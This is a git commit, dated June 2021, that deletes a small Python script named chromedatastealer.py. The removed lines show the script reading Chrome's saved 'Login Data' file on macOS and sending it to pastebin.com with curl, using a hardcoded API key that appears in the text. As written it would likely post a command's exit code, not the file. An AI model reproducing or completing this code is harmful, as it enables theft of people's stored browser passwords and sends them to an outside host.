1716ea0481919b75060b04c15629a8bb59c7a1d9
Stoned Paul <45460445+StonedPaul@users.noreply.github.com>
2021-06-15 01:13:10 -0600

    Delete chromedatastealer.py

--- chromedatastealer.py
+++
@@ -1,7 +0,0 @@
-import os
-import string
-
-
-api_key = 'O_2qxY3B3XiBirO_GnZVlSDCLqutwyBH'
-data = os.system('cd && cd ~/Library/Application\\ Support/Google/Chrome/Default/ && cat Login\\ Data')
-os.system(f'curl -X POST -d \'api_dev_key={api_key}\' -d \'api_paste_code={data}\' -d \'api_option=paste\' \"https://pastebin.com/api/api_post.php\"')
